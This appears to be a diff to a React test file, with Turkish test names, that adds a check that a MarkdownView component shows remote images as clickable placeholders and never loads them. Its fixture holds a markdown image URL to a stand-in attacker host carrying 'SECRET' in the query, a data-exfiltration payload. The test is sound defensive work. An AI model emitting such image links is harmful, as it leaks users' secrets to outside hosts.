@@ -40,6 +40,18 @@ describe("MarkdownView", () => {
     expect(container.querySelectorAll("li").length).toBe(2);
   });
 
+  it("uzak görseli <img> olarak yüklemez; tıklanabilir yer tutucu gösterir", () => {
+    const { container } = render(
+      <MarkdownView
+        text={"cevap\n\n![pixel](https://evil.example/p?d=SECRET) ve ![yerel](./a.png)"}
+      />,
+    );
+    expect(container.querySelector("img")).toBeNull();
+    const link = container.querySelector('a[href^="https://evil.example"]');
+    expect(link?.textContent).toBe("[pixel]");
+    expect(screen.getByText("[yerel]").tagName).toBe("SPAN");
+  });
+
   it("kod bloğunu <code> olarak render eder", () => {
     const { container } = render(<MarkdownView text={"`inline kod`"} />);
     expect(container.querySelector("code")?.textContent).toContain("inline kod");
